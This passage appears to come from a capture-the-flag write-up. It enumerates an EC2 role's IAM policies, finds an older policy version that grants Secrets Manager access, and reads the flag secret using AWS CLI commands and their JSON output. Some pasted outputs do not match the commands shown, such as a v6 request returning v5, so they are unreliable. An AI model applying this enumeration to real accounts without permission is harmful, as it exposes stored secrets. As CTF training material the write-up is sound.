        "CreateDate": "2025-04-04T00:15:10+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "Service": "ec2.amazonaws.com"
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        },
        "Description": "Allows EC2 instances to call AWS services on your behalf.",
        "MaxSessionDuration": 3600,
        "RoleLastUsed": {
            "LastUsedDate": "2025-04-07T14:08:52+00:00",
            "Region": "us-east-2"
        }
    }
}
```
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "ec2instancepolicy",
            "PolicyArn": "arn:aws:iam::614108131227:policy/ec2instancepolicy"
        }
    ]
}
```

- After that, we need to get policy details.
```bash
aws iam get-policy --policy-arn arn:aws:iam::614108131227:policy/ec2instancepolicy
```
```json
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "s3:GetObject"
                    ],
                    "Resource": [
                        "arn:aws:s3:::squ1rrel-flag/*"
                    ]
                }
            ]
        },
        "VersionId": "v6",
        "IsDefaultVersion": true,
        "CreateDate": "2025-04-04T00:37:02+00:00"
    }
}
```

- Now we need to view the policy statement.
```bash
aws iam get-policy-version --policy-arn arn:aws:iam::614108131227:policy/ec2instancepolicy --version-id v6
```
```json
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetRole",
                        "iam:ListAttachedRolePolicies",
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion"
                    ],
                    "Resource": "*"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": [
                        "secretsmanager:GetSecretValue",
                        "secretsmanager:DescribeSecret"
                    ],
                    "Resource": "arn:aws:secretsmanager:us-east-2:614108131227:secret:flag-imCL9a"
                }
            ]
        },
        "VersionId": "v5",
        "IsDefaultVersion": false,
        "CreateDate": "2025-04-04T00:33:42+00:00"
    }
}
```

- Get the flag from Secrets Manager.
```bash
aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:us-east-2:614108131227:secret:flag-imCL9a --region us-east-2
```
```json
{
    "flag": "squ1rrel{you_better_not_have_vibe_coded_the_solution_to_this_challenge}"
}
```

**Flag:** `squ1rrel{you_better_not_have_vibe_coded_the_solution_to_this_challenge}`